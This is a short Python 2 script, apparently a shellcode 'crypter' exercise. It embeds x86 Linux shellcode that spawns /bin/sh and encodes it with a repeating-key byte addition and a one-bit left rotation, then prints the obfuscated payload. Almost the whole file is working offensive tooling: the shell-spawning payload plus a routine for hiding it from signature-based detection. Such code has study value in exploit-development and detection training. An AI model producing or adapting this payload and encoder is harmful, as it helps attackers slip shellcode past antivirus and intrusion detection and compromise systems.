#!/usr/bin/python
# Filename: add-rol-cryptor.py
# Author:   boku

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
key = "HelloFriend"
encrypted = ""
keyArray = bytearray(key)
keyLength = len(bytearray(key))
# count will be used to make the key the same length as the shellcode
count = 0				
for x in bytearray(shellcode) : 
	# If their are no more letters in the key, reuse the key from the start
	if count == keyLength :		
		count = 0
	# Add the first byte of shellcode and key together
	x = x + keyArray[count]		
	if x > 255 :
		# if the key is greater than a byte value, remove the extra byte
		x -= 256		
	if x > 127:
        	x = x - 128             # Remove the left-most bit
        	x = x << 1              # Shift to the left 1
        	x += 1                  # Add 1, to complete the rotate
        	encrypted += '\\x'
        	encrypted += '%02x' %x	# Add the rotated left hex to string 
	else:
        	encrypted += '\\x'       # No leftmost bit, just rotate
        	encrypted += '%02x' %(x << 1)
	count += 1

print encrypted
